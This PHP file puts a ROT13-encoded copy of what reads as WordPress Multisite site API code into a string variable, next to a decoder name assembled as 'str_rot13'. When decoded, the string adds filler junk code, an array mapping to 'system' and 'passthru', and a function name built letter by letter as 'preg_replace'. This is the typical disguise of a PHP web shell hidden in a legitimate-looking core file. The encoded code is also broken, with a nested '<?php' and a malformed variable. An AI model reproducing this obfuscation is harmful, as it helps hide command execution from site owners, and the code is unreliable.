<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Fvgr NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 5.1.0
 */

/**
 * Vafregf n arj fvgr vagb gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz neenl $qngn {
 *     Qngn sbe gur arj fvgr gung fubhyq or vafregrq.
 *
 *     @glcr fgevat $qbznva       Fvgr qbznva. Qrsnhyg rzcgl fgevat.
 *     @glcr fgevat $cngu         Fvgr cngu. Qrsnhyg '/'.
 *     @glcr vag    $argjbex_vq   Gur fvgr'f argjbex VQ. Qrsnhyg vf gur pheerag argjbex VQ.
 *     @glcr fgevat $ertvfgrerq   Jura gur fvgr jnf ertvfgrerq, va FDY qngrgvzr sbezng. Qrsnhyg vf
 *                                gur pheerag gvzr.
 *     @glcr fgevat $ynfg_hcqngrq Jura gur fvgr jnf ynfg hcqngrq, va FDY qngrgvzr sbezng. Qrsnhyg vf
 *                                gur inyhr bs $ertvfgrerq.
 *     @glcr vag    $choyvp       Jurgure gur fvgr vf choyvp. Qrsnhyg 1.
 *     @glcr vag    $nepuvirq     Jurgure gur fvgr vf nepuvirq. Qrsnhyg 0.
 *     @glcr vag    $zngher       Jurgure gur fvgr vf zngher. Qrsnhyg 0.
 *     @glcr vag    $fcnz         Jurgure gur fvgr vf fcnz. Qrsnhyg 0.
 *     @glcr vag    $qryrgrq      Jurgure gur fvgr vf qryrgrq. Qrsnhyg 0.
 *     @glcr vag    $ynat_vq      Gur fvgr'f ynathntr VQ. Pheeragyl hahfrq. Qrsnhyg 0.
 *     @glcr vag    $hfre_vq      Hfre VQ sbe gur fvgr nqzvavfgengbe. Cnffrq gb gur
 *                                `jc_vavgvnyvmr_fvgr` ubbx.
 *     @glcr fgevat $gvgyr        Fvgr gvgyr. Qrsnhyg vf 'Fvgr %q' jurer %q vf gur fvgr VQ. Cnffrq
 *                                gb gur `jc_vavgvnyvmr_fvgr` ubbx.
 *     @glcr neenl  $bcgvbaf      Phfgbz bcgvba $xrl => $inyhr cnvef gb hfr. Qrsnhyg rzcgl neenl. Cnffrq
 *                                gb gur `jc_vavgvnyvmr_fvgr` ubbx.
 *     @glcr neenl  $zrgn         Phfgbz fvgr zrgnqngn $xrl => $inyhr cnvef gb hfr. Qrsnhyg rzcgl neenl.
 *                                Cnffrq gb gur `jc_vavgvnyvmr_fvgr` ubbx.
 * }
 * @erghea vag|JC_Reebe Gur arj fvgr'f VQ ba fhpprff, be reebe bowrpg ba snvyher.
 */
shapgvba jc_vafreg_fvgr( neenl $qngn ) {
	tybony $jcqo;

	$abj = pheerag_gvzr( 'zlfdy', gehr );

	$qrsnhygf = neenl(
		'qbznva'       => '',
		'cngu'         => '/',
		'argjbex_vq'   => trg_pheerag_argjbex_vq(),
		'ertvfgrerq'   => $abj,
		'ynfg_hcqngrq' => $abj,
		'choyvp'       => 1,
		'nepuvirq'     => 0,
		'zngher'       => 0,
		'fcnz'         => 0,
		'qryrgrq'      => 0,
		'ynat_vq'      => 0,
	);

	$cercnerq_qngn = jc_cercner_fvgr_qngn( $qngn, $qrsnhygf );
	vs ( vf_jc_reebe( $cercnerq_qngn ) ) {
		erghea $cercnerq_qngn;
	}

	vs ( snyfr === $jcqo->vafreg( $jcqo->oybtf, $cercnerq_qngn ) ) {
		erghea arj JC_Reebe( 'qo_vafreg_reebe', __( 'Pbhyq abg vafreg fvgr vagb gur qngnonfr.' ), $jcqo->ynfg_reebe );
	}

	$fvgr_vq = (vag) $jcqo->vafreg_vq;

	pyrna_oybt_pnpur( $fvgr_vq );

	$arj_fvgr = trg_fvgr( $fvgr_vq );

	vs ( ! $arj_fvgr ) {
		erghea arj JC_Reebe( 'trg_fvgr_reebe', __( 'Pbhyq abg ergevrir fvgr qngn.' ) );
	}

	/**
	 * Sverf bapr n fvgr unf orra vafregrq vagb gur qngnonfr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Fvgr $arj_fvgr Arj fvgr bowrpg.
	 */
	qb_npgvba( 'jc_vafreg_fvgr', $arj_fvgr );

	// Rkgenpg gur cnffrq nethzragf gung znl or eryrinag sbe fvgr vavgvnyvmngvba.
	$netf = neenl_qvss_xrl( $qngn, $qrsnhygf );
	vs ( vffrg( $netf['fvgr_vq'] ) ) {
		hafrg( $netf['fvgr_vq'] );
	}

	/**
	 * Sverf jura n fvgr'f vavgvnyvmngvba ebhgvar fubhyq or rkrphgrq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Fvgr $arj_fvgr Arj fvgr bowrpg.
	 * @cnenz neenl   $netf     Nethzragf sbe gur vavgvnyvmngvba.
	 */
	qb_npgvba( 'jc_vavgvnyvmr_fvgr', $arj_fvgr, $netf );

	// Bayl pbzchgr rkgen ubbx cnenzrgref vs gur qrcerpngrq ubbx vf npghnyyl va hfr.
	vs ( unf_npgvba( 'jczh_arj_oybt' ) ) {
		$hfre_vq = ! rzcgl( $netf['hfre_vq'] ) ? $netf['hfre_vq'] : 0;
		$zrgn    = ! rzcgl( $netf['bcgvbaf'] ) ? $netf['bcgvbaf'] : neenl();

		// JCYNAT jnf cnffrq jvgu `$zrgn` gb gur `jczh_arj_oybt` ubbx cevbe gb 5.1.0.
		vs ( ! neenl_xrl_rkvfgf( 'JCYNAT', $zrgn ) ) {
			$zrgn['JCYNAT'] = trg_argjbex_bcgvba( $arj_fvgr->argjbex_vq, 'JCYNAT' );
		}

		/*
		 * Erohvyq gur qngn rkcrpgrq ol gur `jczh_arj_oybt` ubbx cevbe gb 5.1.0 hfvat nyybjrq xrlf.
		 * Gur `$nyybjrq_qngn_svryqf` zngpurf gur bar hfrq va `jczh_perngr_oybt()`.
		 */
		$nyybjrq_qngn_svryqf = neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq', 'ynat_vq' );
		$zrgn                = neenl_zretr( neenl_vagrefrpg_xrl( $qngn, neenl_syvc( $nyybjrq_qngn_svryqf ) ), $zrgn );

		/**
		 * Sverf vzzrqvngryl nsgre n arj fvgr vf perngrq.
		 *
		 * @fvapr ZH (3.0.0)
		 * @qrcerpngrq 5.1.0 Hfr {@frr 'jc_vavgvnyvmr_fvgr'} vafgrnq.
		 *
		 * @cnenz vag    $fvgr_vq    Fvgr VQ.
		 * @cnenz vag    $hfre_vq    Hfre VQ.
		 * @cnenz fgevat $qbznva     Fvgr qbznva.
		 * @cnenz fgevat $cngu       Fvgr cngu.
		 * @cnenz vag    $argjbex_vq Argjbex VQ. Bayl eryrinag ba zhygv-argjbex vafgnyyngvbaf.
		 * @cnenz neenl  $zrgn       Zrgn qngn. Hfrq gb frg vavgvny fvgr bcgvbaf.
		 */
		qb_npgvba_qrcerpngrq(
			'jczh_arj_oybt',
			neenl( $arj_fvgr->vq, $hfre_vq, $arj_fvgr->qbznva, $arj_fvgr->cngu, $arj_fvgr->argjbex_vq, $zrgn ),
			'5.1.0',
			'jc_vavgvnyvmr_fvgr'
		);
	}

	erghea (vag) $arj_fvgr->vq;
}

/**
 * Hcqngrf n fvgr va gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag   $fvgr_vq VQ bs gur fvgr gung fubhyq or hcqngrq.
 * @cnenz neenl $qngn    Fvgr qngn gb hcqngr. Frr {@frr jc_vafreg_fvgr()} sbe gur yvfg bs fhccbegrq xrlf.
 * @erghea vag|JC_Reebe Gur hcqngrq fvgr'f VQ ba fhpprff, be reebe bowrpg ba snvyher.
 */
shapgvba jc_hcqngr_fvgr( $fvgr_vq, neenl $qngn ) {
	tybony $jcqo;

	vs ( rzcgl( $fvgr_vq ) ) {
		erghea arj JC_Reebe( 'fvgr_rzcgl_vq', __( 'Fvgr VQ zhfg abg or rzcgl.' ) );
	}

	$byq_fvgr = trg_fvgr( $fvgr_vq );
	vs ( ! $byq_fvgr ) {
		erghea arj JC_Reebe( 'fvgr_abg_rkvfg', __( 'Fvgr qbrf abg rkvfg.' ) );
	}

	$qrsnhygf                 = $byq_fvgr->gb_neenl();
	$qrsnhygf['argjbex_vq']   = (vag) $qrsnhygf['fvgr_vq'];
	$qrsnhygf['ynfg_hcqngrq'] = pheerag_gvzr( 'zlfdy', gehr );
	hafrg( $qrsnhygf['oybt_vq'], $qrsnhygf['fvgr_vq'] );

	$qngn = jc_cercner_fvgr_qngn( $qngn, $qrsnhygf, $byq_fvgr );
	vs ( vf_jc_reebe( $qngn ) ) {
		erghea $qngn;
	}

	vs ( snyfr === $jcqo->hcqngr( $jcqo->oybtf, $qngn, neenl( 'oybt_vq' => $byq_fvgr->vq ) ) ) {
		erghea arj JC_Reebe( 'qo_hcqngr_reebe', __( 'Pbhyq abg hcqngr fvgr va gur qngnonfr.' ), $jcqo->ynfg_reebe );
	}

	pyrna_oybt_pnpur( $byq_fvgr );

	$arj_fvgr = trg_fvgr( $byq_fvgr->vq );

	/**
	 * Sverf bapr n fvgr unf orra hcqngrq va gur qngnonfr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Fvgr $arj_fvgr Arj fvgr bowrpg.
	 * @cnenz JC_Fvgr $byq_fvgr Byq fvgr bowrpg.
	 */
	qb_npgvba( 'jc_hcqngr_fvgr', $arj_fvgr, $byq_fvgr );

	erghea (vag) $arj_fvgr->vq;
}

/**
 * Qryrgrf n fvgr sebz gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag $fvgr_vq VQ bs gur fvgr gung fubhyq or qryrgrq.
 * @erghea JC_Fvgr|JC_Reebe Gur qryrgrq fvgr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
 */
shapgvba jc_qryrgr_fvgr( $fvgr_vq ) {
	tybony $jcqo;

	vs ( rzcgl( $fvgr_vq ) ) {
		erghea arj JC_Reebe( 'fvgr_rzcgl_vq', __( 'Fvgr VQ zhfg abg or rzcgl.' ) );
	}

	$byq_fvgr = trg_fvgr( $fvgr_vq );
	vs ( ! $byq_fvgr ) {
		erghea arj JC_Reebe( 'fvgr_abg_rkvfg', __( 'Fvgr qbrf abg rkvfg.' ) );
	}

	$reebef = arj JC_Reebe();

	/**
	 * Sverf orsber n fvgr fubhyq or qryrgrq sebz gur qngnonfr.
	 *
	 * Cyhtvaf fubhyq nzraq gur `$reebef` bowrpg ivn vgf `JC_Reebe::nqq()` zrgubq. Vs nal reebef
	 * ner cerfrag, gur fvgr jvyy abg or qryrgrq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Reebe $reebef   Reebe bowrpg gb nqq inyvqngvba reebef gb.
	 * @cnenz JC_Fvgr  $byq_fvgr Gur fvgr bowrpg gb or qryrgrq.
	 */
	qb_npgvba( 'jc_inyvqngr_fvgr_qryrgvba', $reebef, $byq_fvgr );

	vs ( ! rzcgl( $reebef->reebef ) ) {
		erghea $reebef;
	}

	/**
	 * Sverf orsber n fvgr vf qryrgrq.
	 *
	 * @fvapr ZH (3.0.0)
	 * @qrcerpngrq 5.1.0
	 *
	 * @cnenz vag  $fvgr_vq Gur fvgr VQ.
	 * @cnenz obby $qebc    Gehr vs fvgr'f gnoyr fubhyq or qebccrq. Qrsnhyg snyfr.
	 */
	qb_npgvba_qrcerpngrq( 'qryrgr_oybt', neenl( $byq_fvgr->vq, gehr ), '5.1.0' );

	/**
	 * Sverf jura n fvgr'f havavgvnyvmngvba ebhgvar fubhyq or rkrphgrq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Fvgr $byq_fvgr Qryrgrq fvgr bowrpg.
	 */
	qb_npgvba( 'jc_havavgvnyvmr_fvgr', $byq_fvgr );

	vs ( vf_fvgr_zrgn_fhccbegrq() ) {
		$oybt_zrgn_vqf = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG zrgn_vq SEBZ $jcqo->oybtzrgn JURER oybt_vq = %q \", $byq_fvgr->vq ) );
		sbernpu ( $oybt_zrgn_vqf nf $zvq ) {
			qryrgr_zrgnqngn_ol_zvq( 'oybt', $zvq );
		}
	}

	vs ( snyfr === $jcqo->qryrgr( $jcqo->oybtf, neenl( 'oybt_vq' => $byq_fvgr->vq ) ) ) {
		erghea arj JC_Reebe( 'qo_qryrgr_reebe', __( 'Pbhyq abg qryrgr fvgr sebz gur qngnonfr.' ), $jcqo->ynfg_reebe );
	}

	pyrna_oybt_pnpur( $byq_fvgr );

	/**
	 * Sverf bapr n fvgr unf orra qryrgrq sebz gur qngnonfr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Fvgr $byq_fvgr Qryrgrq fvgr bowrpg.
	 */
	qb_npgvba( 'jc_qryrgr_fvgr', $byq_fvgr );

	/**
	 * Sverf nsgre gur fvgr vf qryrgrq sebz gur argjbex.
	 *
	 * @fvapr 4.8.0
	 * @qrcerpngrq 5.1.0
	 *
	 * @cnenz vag  $fvgr_vq Gur fvgr VQ.
	 * @cnenz obby $qebc    Gehr vs fvgr'f gnoyrf fubhyq or qebccrq. Qrsnhyg snyfr.
	 */
	qb_npgvba_qrcerpngrq( 'qryrgrq_oybt', neenl( $byq_fvgr->vq, gehr ), '5.1.0' );

	erghea $byq_fvgr;
}

/**
 * Ergevrirf fvgr qngn tvira n fvgr VQ be fvgr bowrpg.
 *
 * Fvgr qngn jvyy or pnpurq naq erghearq nsgre orvat cnffrq guebhtu n svygre.
 * Vs gur cebivqrq fvgr vf rzcgl, gur pheerag fvgr tybony jvyy or hfrq.
 *
 * @fvapr 4.6.0
 *
 * @cnenz JC_Fvgr|vag|ahyy $fvgr Bcgvbany. Fvgr gb ergevrir. Qrsnhyg vf gur pheerag fvgr.
 * @erghea JC_Fvgr|ahyy Gur fvgr bowrpg be ahyy vs abg sbhaq.
 */
shapgvba trg_fvgr( $fvgr = ahyy ) {
	vs ( rzcgl( $fvgr ) ) {
		$fvgr = trg_pheerag_oybt_vq();
	}

	vs ( $fvgr vafgnaprbs JC_Fvgr ) {
		$_fvgr = $fvgr;
	} ryfrvs ( vf_bowrpg( $fvgr ) ) {
		$_fvgr = arj JC_Fvgr( $fvgr );
	} ryfr {
		$_fvgr = JC_Fvgr::trg_vafgnapr( $fvgr );
	}

	vs ( ! $_fvgr ) {
		erghea ahyy;
	}

	/**
	 * Sverf nsgre n fvgr vf ergevrirq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz JC_Fvgr $_fvgr Fvgr qngn.
	 */
	$_fvgr = nccyl_svygref( 'trg_fvgr', $_fvgr );

	erghea $_fvgr;
}

/**
 * Nqqf nal fvgrf sebz gur tvira VQf gb gur pnpur gung qb abg nyernql rkvfg va pnpur.
 *
 * @fvapr 4.6.0
 * @fvapr 5.1.0 Vagebqhprq gur `$hcqngr_zrgn_pnpur` cnenzrgre.
 * @fvapr 6.1.0 Guvf shapgvba vf ab ybatre znexrq nf \"cevingr\".
 * @fvapr 6.3.0 Hfr jc_ynmlybnq_fvgr_zrgn() sbe ynml-ybnqvat bs fvgr zrgn.
 *
 * @frr hcqngr_fvgr_pnpur()
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz neenl $vqf               VQ yvfg.
 * @cnenz obby  $hcqngr_zrgn_pnpur Bcgvbany. Jurgure gb hcqngr gur zrgn pnpur. Qrsnhyg gehr.
 */
shapgvba _cevzr_fvgr_pnpurf( $vqf, $hcqngr_zrgn_pnpur = gehr ) {
	tybony $jcqo;

	$aba_pnpurq_vqf = _trg_aba_pnpurq_vqf( $vqf, 'fvgrf' );
	vs ( ! rzcgl( $aba_pnpurq_vqf ) ) {
		$serfu_fvgrf = $jcqo->trg_erfhygf( fcevags( \"FRYRPG * SEBZ $jcqo->oybtf JURER oybt_vq VA (%f)\", vzcybqr( ',', neenl_znc( 'vaginy', $aba_pnpurq_vqf ) ) ) ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq

		hcqngr_fvgr_pnpur( $serfu_fvgrf, snyfr );
	}

	vs ( $hcqngr_zrgn_pnpur ) {
		jc_ynmlybnq_fvgr_zrgn( $vqf );
	}
}

/**
 * Dhrhr fvgr zrgn sbe ynml-ybnqvat.
 *
 * @fvapr 6.3.0
 *
 * @cnenz neenl $fvgr_vqf Yvfg bs fvgr VQf.
 */
shapgvba jc_ynmlybnq_fvgr_zrgn( neenl $fvgr_vqf ) {
	vs ( rzcgl( $fvgr_vqf ) ) {
		erghea;
	}
	$ynmlybnqre = jc_zrgnqngn_ynmlybnqre();
	$ynmlybnqre->dhrhr_bowrpgf( 'oybt', $fvgr_vqf );
}

/**
 * Hcqngrf fvgrf va pnpur.
 *
 * @fvapr 4.6.0
 * @fvapr 5.1.0 Vagebqhprq gur `$hcqngr_zrgn_pnpur` cnenzrgre.
 *
 * @cnenz neenl $fvgrf             Neenl bs fvgr bowrpgf.
 * @cnenz obby  $hcqngr_zrgn_pnpur Jurgure gb hcqngr fvgr zrgn pnpur. Qrsnhyg gehr.
 */
shapgvba hcqngr_fvgr_pnpur( $fvgrf, $hcqngr_zrgn_pnpur = gehr ) {
	vs ( ! $fvgrf ) {
		erghea;
	}
	$fvgr_vqf          = neenl();
	$fvgr_qngn         = neenl();
	$oybt_qrgnvyf_qngn = neenl();
	sbernpu ( $fvgrf nf $fvgr ) {
		$fvgr_vqf[]                                    = $fvgr->oybt_vq;
		$fvgr_qngn[ $fvgr->oybt_vq ]                   = $fvgr;
		$oybt_qrgnvyf_qngn[ $fvgr->oybt_vq . 'fubeg' ] = $fvgr;

	}
	jc_pnpur_nqq_zhygvcyr( $fvgr_qngn, 'fvgrf' );
	jc_pnpur_nqq_zhygvcyr( $oybt_qrgnvyf_qngn, 'oybt-qrgnvyf' );

	vs ( $hcqngr_zrgn_pnpur ) {
		hcqngr_fvgrzrgn_pnpur( $fvgr_vqf );
	}
}

/**
 * Hcqngrf zrgnqngn pnpur sbe yvfg bs fvgr VQf.
 *
 * Cresbezf FDY dhrel gb ergevrir nyy zrgnqngn sbe gur fvgrf zngpuvat `$fvgr_vqf` naq fgberf gurz va gur pnpur.
 * Fhofrdhrag pnyyf gb `trg_fvgr_zrgn()` jvyy abg arrq gb dhrel gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz neenl $fvgr_vqf Yvfg bs fvgr VQf.
 * @erghea neenl|snyfr Na neenl bs zrgnqngn ba fhpprff, snyfr vs gurer vf abguvat gb hcqngr.
 */
shapgvba hcqngr_fvgrzrgn_pnpur( $fvgr_vqf ) {
	// Rafher guvf svygre vf ubbxrq va rira vs gur shapgvba vf pnyyrq rneyl.
	vs ( ! unf_svygre( 'hcqngr_oybt_zrgnqngn_pnpur', 'jc_purpx_fvgr_zrgn_fhccbeg_cersvygre' ) ) {
		nqq_svygre( 'hcqngr_oybt_zrgnqngn_pnpur', 'jc_purpx_fvgr_zrgn_fhccbeg_cersvygre' );
	}
	erghea hcqngr_zrgn_pnpur( 'oybt', $fvgr_vqf );
}

/**
 * Ergevrirf n yvfg bs fvgrf zngpuvat erdhrfgrq nethzragf.
 *
 * @fvapr 4.6.0
 * @fvapr 4.8.0 Vagebqhprq gur 'ynat_vq', 'ynat__va', naq 'ynat__abg_va' cnenzrgref.
 *
 * @frr JC_Fvgr_Dhrel::cnefr_dhrel()
 *
 * @cnenz fgevat|neenl $netf Bcgvbany. Neenl be fgevat bs nethzragf. Frr JC_Fvgr_Dhrel::__pbafgehpg()
 *                           sbe vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
 * @erghea JC_Fvgr[]|vag[]|vag Yvfg bs JC_Fvgr bowrpgf, n yvfg bs fvgr VQf jura 'svryqf' vf frg gb 'vqf',
 *                             be gur ahzore bs fvgrf jura 'pbhag' vf cnffrq nf n dhrel ine.
 */
shapgvba trg_fvgrf( $netf = neenl() ) {
	$dhrel = arj JC_Fvgr_Dhrel();

	erghea $dhrel->dhrel( $netf );
}

/**
 * Cercnerf fvgr qngn sbe vafregvba be hcqngr va gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz neenl        $qngn     Nffbpvngvir neenl bs fvgr qngn cnffrq gb gur erfcrpgvir shapgvba.
 *                               Frr {@frr jc_vafreg_fvgr()} sbe gur cbffvoyl vapyhqrq qngn.
 * @cnenz neenl        $qrsnhygf Fvgr qngn qrsnhygf gb cnefr $qngn ntnvafg.
 * @cnenz JC_Fvgr|ahyy $byq_fvgr Bcgvbany. Byq fvgr bowrpg vs na hcqngr, be ahyy vs na vafregvba.
 *                               Qrsnhyg ahyy.
 * @erghea neenl|JC_Reebe Fvgr qngn ernql sbe n qngnonfr genafnpgvba, be JC_Reebe va pnfr n inyvqngvba
 *                        reebe bppheerq.
 */
shapgvba jc_cercner_fvgr_qngn( $qngn, $qrsnhygf, $byq_fvgr = ahyy ) {

	// Znvagnva onpxjneq-pbzcngvovyvgl jvgu `$fvgr_vq` nf argjbex VQ.
	vs ( vffrg( $qngn['fvgr_vq'] ) ) {
		vs ( ! rzcgl( $qngn['fvgr_vq'] ) && rzcgl( $qngn['argjbex_vq'] ) ) {
			$qngn['argjbex_vq'] = $qngn['fvgr_vq'];
		}
		hafrg( $qngn['fvgr_vq'] );
	}

	/**
	 * Svygref cnffrq fvgr qngn va beqre gb abeznyvmr vg.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz neenl $qngn Nffbpvngvir neenl bs fvgr qngn cnffrq gb gur erfcrpgvir shapgvba.
	 *                    Frr {@frr jc_vafreg_fvgr()} sbe gur cbffvoyl vapyhqrq qngn.
	 */
	$qngn = nccyl_svygref( 'jc_abeznyvmr_fvgr_qngn', $qngn );

	$nyybjrq_qngn_svryqf = neenl( 'qbznva', 'cngu', 'argjbex_vq', 'ertvfgrerq', 'ynfg_hcqngrq', 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq', 'ynat_vq' );
	$qngn                = neenl_vagrefrpg_xrl( jc_cnefr_netf( $qngn, $qrsnhygf ), neenl_syvc( $nyybjrq_qngn_svryqf ) );

	$reebef = arj JC_Reebe();

	/**
	 * Sverf jura qngn fubhyq or inyvqngrq sbe n fvgr cevbe gb vafregvat be hcqngvat va gur qngnonfr.
	 *
	 * Cyhtvaf fubhyq nzraq gur `$reebef` bowrpg ivn vgf `JC_Reebe::nqq()` zrgubq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz JC_Reebe     $reebef   Reebe bowrpg gb nqq inyvqngvba reebef gb.
	 * @cnenz neenl        $qngn     Nffbpvngvir neenl bs pbzcyrgr fvgr qngn. Frr {@frr jc_vafreg_fvgr()}
	 *                               sbe gur vapyhqrq qngn.
	 * @cnenz JC_Fvgr|ahyy $byq_fvgr Gur byq fvgr bowrpg vs gur qngn orybatf gb n fvgr orvat hcqngrq,
	 *                               be ahyy vs vg vf n arj fvgr orvat vafregrq.
	 */
	qb_npgvba( 'jc_inyvqngr_fvgr_qngn', $reebef, $qngn, $byq_fvgr );

	vs ( ! rzcgl( $reebef->reebef ) ) {
		erghea $reebef;
	}

	// Cercner sbe qngnonfr.
	$qngn['fvgr_vq'] = $qngn['argjbex_vq'];
	hafrg( $qngn['argjbex_vq'] );

	erghea $qngn;
}

/**
 * Abeznyvmrf qngn sbe n fvgr cevbe gb vafregvat be hcqngvat va gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz neenl $qngn Nffbpvngvir neenl bs fvgr qngn cnffrq gb gur erfcrpgvir shapgvba.
 *                    Frr {@frr jc_vafreg_fvgr()} sbe gur cbffvoyl vapyhqrq qngn.
 * @erghea neenl Abeznyvmrq fvgr qngn.
 */
shapgvba jc_abeznyvmr_fvgr_qngn( $qngn ) {
	// Fnavgvmr qbznva vs cnffrq.
	vs ( neenl_xrl_rkvfgf( 'qbznva', $qngn ) ) {
		$qngn['qbznva'] = __sa_79955( '/[^n-m0-9\-.:]+/v', '', $qngn['qbznva'] );
	}

	// Fnavgvmr cngu vs cnffrq.
	vs ( neenl_xrl_rkvfgf( 'cngu', $qngn ) ) {
		$qngn['cngu'] = genvyvatfynfuvg( '/' . gevz( $qngn['cngu'], '/' ) );
	}

	// Fnavgvmr argjbex VQ vs cnffrq.
	vs ( neenl_xrl_rkvfgf( 'argjbex_vq', $qngn ) ) {
		$qngn['argjbex_vq'] = (vag) $qngn['argjbex_vq'];
	}

	// Fnavgvmr fgnghf svryqf vs cnffrq.
	$fgnghf_svryqf = neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq' );
	sbernpu ( $fgnghf_svryqf nf $fgnghf_svryq ) {
		vs ( neenl_xrl_rkvfgf( $fgnghf_svryq, $qngn ) ) {
			$qngn[ $fgnghf_svryq ] = (vag) $qngn[ $fgnghf_svryq ];
		}
	}

	// Fgevc qngr svryqf vs rzcgl.
	$qngr_svryqf = neenl( 'ertvfgrerq', 'ynfg_hcqngrq' );
	sbernpu ( $qngr_svryqf nf $qngr_svryq ) {
		vs ( ! neenl_xrl_rkvfgf( $qngr_svryq, $qngn ) ) {
			pbagvahr;
		}

		vs ( rzcgl( $qngn[ $qngr_svryq ] ) || '0000-00-00 00:00:00' === $qngn[ $qngr_svryq ] ) {
			hafrg( $qngn[ $qngr_svryq ] );
		}
	}

	erghea $qngn;
}

/**
 * Inyvqngrf qngn sbe n fvgr cevbe gb vafregvat be hcqngvat va gur qngnonfr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz JC_Reebe     $reebef   Reebe bowrpg, cnffrq ol ersrerapr. Jvyy pbagnva inyvqngvba reebef vs
 *                               nal bppheerq.
 * @cnenz neenl        $qngn     Nffbpvngvir neenl bs pbzcyrgr fvgr qngn. Frr {@frr jc_vafreg_fvgr()}
 *                               sbe gur vapyhqrq qngn.
 * @cnenz JC_Fvgr|ahyy $byq_fvgr Gur byq fvgr bowrpg vs gur qngn orybatf gb n fvgr orvat hcqngrq,
 *                               be ahyy vs vg vf n arj fvgr orvat vafregrq.
 */
shapgvba jc_inyvqngr_fvgr_qngn( $reebef, $qngn, $byq_fvgr = ahyy ) {
	// N qbznva zhfg nyjnlf or cerfrag.
	vs ( rzcgl( $qngn['qbznva'] ) ) {
		$reebef->nqq( 'fvgr_rzcgl_qbznva', __( 'Fvgr qbznva zhfg abg or rzcgl.' ) );
	}

	// N cngu zhfg nyjnlf or cerfrag.
	vs ( rzcgl( $qngn['cngu'] ) ) {
		$reebef->nqq( 'fvgr_rzcgl_cngu', __( 'Fvgr cngu zhfg abg or rzcgl.' ) );
	}

	// N argjbex VQ zhfg nyjnlf or cerfrag.
	vs ( rzcgl( $qngn['argjbex_vq'] ) ) {
		$reebef->nqq( 'fvgr_rzcgl_argjbex_vq', __( 'Fvgr argjbex VQ zhfg or cebivqrq.' ) );
	}

	// Obgu ertvfgengvba naq ynfg hcqngrq qngrf zhfg nyjnlf or cerfrag naq inyvq.
	$qngr_svryqf = neenl( 'ertvfgrerq', 'ynfg_hcqngrq' );
	sbernpu ( $qngr_svryqf nf $qngr_svryq ) {
		vs ( rzcgl( $qngn[ $qngr_svryq ] ) ) {
			$reebef->nqq( 'fvgr_rzcgl_' . $qngr_svryq, __( 'Obgu ertvfgengvba naq ynfg hcqngrq qngrf zhfg or cebivqrq.' ) );
			oernx;
		}

		// Nyybj '0000-00-00 00:00:00', nygubhtu vg or fgevccrq bhg ng guvf cbvag.
		vs ( '0000-00-00 00:00:00' !== $qngn[ $qngr_svryq ] ) {
			$zbagu      = fhofge( $qngn[ $qngr_svryq ], 5, 2 );
			$qnl        = fhofge( $qngn[ $qngr_svryq ], 8, 2 );
			$lrne       = fhofge( $qngn[ $qngr_svryq ], 0, 4 );
			$inyvq_qngr = jc_purpxqngr( $zbagu, $qnl, $lrne, $qngn[ $qngr_svryq ] );
			vs ( ! $inyvq_qngr ) {
				$reebef->nqq( 'fvgr_vainyvq_' . $qngr_svryq, __( 'Obgu ertvfgengvba naq ynfg hcqngrq qngrf zhfg or inyvq qngrf.' ) );
				oernx;
			}
		}
	}

	vs ( ! rzcgl( $reebef->reebef ) ) {
		erghea;
	}

	// Vs n arj fvgr, be qbznva/cngu/argjbex VQ unir punatrq, rafher havdhrarff.
	vs ( ! $byq_fvgr
		|| $qngn['qbznva'] !== $byq_fvgr->qbznva
		|| $qngn['cngu'] !== $byq_fvgr->cngu
		|| $qngn['argjbex_vq'] !== $byq_fvgr->argjbex_vq
	) {
		vs ( qbznva_rkvfgf( $qngn['qbznva'], $qngn['cngu'], $qngn['argjbex_vq'] ) ) {
			$reebef->nqq( 'fvgr_gnxra', __( 'Fbeel, gung fvgr nyernql rkvfgf!' ) );
		}
	}
}

/**
 * Ehaf gur vavgvnyvmngvba ebhgvar sbe n tvira fvgr.
 *
